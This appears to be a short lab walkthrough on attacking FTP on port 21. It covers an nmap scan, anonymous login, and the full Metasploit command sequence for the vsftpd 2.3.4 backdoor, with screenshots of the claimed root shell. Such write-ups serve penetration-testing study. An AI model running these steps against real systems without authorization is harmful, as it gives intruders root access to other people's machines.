# Port 21 Ftp

## Step: 1. Scanning for ftp vulnurabilty through nmap built-in script
    
    nmap Target-IP -p 21 -sV -sC
  
  - nmap Target-IP #basic usage of nmap
  - -p  #search for specific port
  - -sV #determin service version
  - -sC #uses default nmap scripts to find vuln

THe machine seems to be running vsftpd 2.3.4 and in
ftp 2.3.4 Anonymous FTP login is allowed

## Method: 1 By Anonymous Login

In terminal type -
    
     ftp Target-IP 21
     
And type Anonymous in username and enter two times.

<img width="747" height="415" alt="3 1-ANonymous-login" src="https://github.com/user-attachments/assets/a17b9800-472b-4612-a424-cd16e47cf71a" />

## Method: 2 By vsftpd 2.3.4 backdoor

The vulnerability allows attackers to gain root shell access by sending a 
username containing the smiley face sequence :) during an FTP login attempt

You can learn more about this exploit in [My_Other_Repo](https://github.com/ctrl-sid2099/Vsftpd-2.3.4-Backdoor-Exploit)
Also i have made a dedicated python [script](https://github.com/ctrl-sid2099/Vsftpd-2.3.4-Backdoor-Exploit/tree/main/Vsftpd_2.3.4_Script) to exploit this flaw.

Or you can exploit it by using metasploit-framework.

In terminal type -
     
    msfconsole
    search vsftpd 2.3.4
    use exploit/unix/ftp/vsftpd_234_backdoor
    show options
    set LHOST Your-IP
    set RHOSTS Target-IP

<img width="856" height="348" alt="3 Choosing-exploit" src="https://github.com/user-attachments/assets/a584bb24-5f28-4ebe-aa6d-8dbac1d45bb4" />

And finaly run the exploit using

    run
    
## 🔥 And Success 

<img width="784" height="667" alt="4 ftp-exploit-succss" src="https://github.com/user-attachments/assets/454720b9-4299-4927-86f7-ecd9c5021f2e" />



    
